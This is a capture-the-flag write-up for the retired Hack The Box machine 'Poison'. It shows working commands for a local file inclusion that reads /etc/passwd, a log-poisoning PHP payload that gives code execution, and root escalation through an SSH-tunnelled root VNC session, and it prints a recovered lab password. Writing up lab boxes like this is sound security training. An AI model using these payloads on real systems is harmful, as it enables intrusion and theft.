---
machine: Poison
os: FreeBSD
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [freebsd, lfi, php, log-poisoning, vnc, tunneling]
---

# Poison — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A **FreeBSD** host with an **LFI** in `browse.php`. A `pwdbackup.txt` base64-encoded thirteen times yields `charix`'s password; their home holds a `secret.zip` containing the password file of a **VNC running as root** on `127.0.0.1:5901`. SSH tunnel plus `vncviewer` with that file: a root desktop.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp  http  Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
```

The site is a file-listing tool. `whatweb` confirms Apache on FreeBSD with PHP 5.6.

## LFI

```bash
curl -s "http://<IP>/browse.php?file=/etc/passwd"
```

```text
root:*:0:0:Charlie &:/root:/bin/csh
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

The web root holds `pwdbackup.txt` with the password encoded in base64 **thirteen times**:

```bash
for i in $(seq 13); do echo "$(cat pwdbackup.txt)" | base64 -d > step$i; mv step$i pwdbackup.txt; done
cat pwdbackup.txt
```

```text
Charix!2#4%6&8(0
```

Optional RCE through log poisoning: the LFI includes the Apache log and executes whatever is written to it.

```bash
curl -s -H "User-Agent: <?php system(\$_GET['c']); ?>" "http://<IP>/browse.php?file=/var/log/httpd-access.log&c=id"
```

## Access

```bash
ssh charix@<IP>
```

In the home:

```bash
ls -la
unzip secret.zip        # asks for charix's password
```

`secret` is a VNC authentication file, not a plaintext password.

## Escalation through VNC

```bash
netstat -na -p tcp
ps -auwwx | grep -i vnc
```

```text
tcp4  0  0 127.0.0.1.5801  *.*  LISTEN
tcp4  0  0 127.0.0.1.5901  *.*  LISTEN
root  529  ... Xvnc :1 -auth /root/.Xauthority -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost
```

VNC listens on loopback only and runs as **root**. Forward the port and use the `secret` file as the credential:

```bash
ssh -L 5901:127.0.0.1:5901 charix@<IP>
vncviewer 127.0.0.1:5901 -passwd secret
```

Inside the desktop, open a terminal as root and read `/root/root.txt`.

## Lessons

- The LFI reads the app and finds the obfuscated file; repeated base64 is only a layer, not encryption.
- A ZIP protected with the user's own password protects nothing.
- A local VNC running as root is root: `-localhost` is useless once SSH exists.
- Detection: absolute or `../` paths in `browse.php`, and SSH tunnels to 5901.
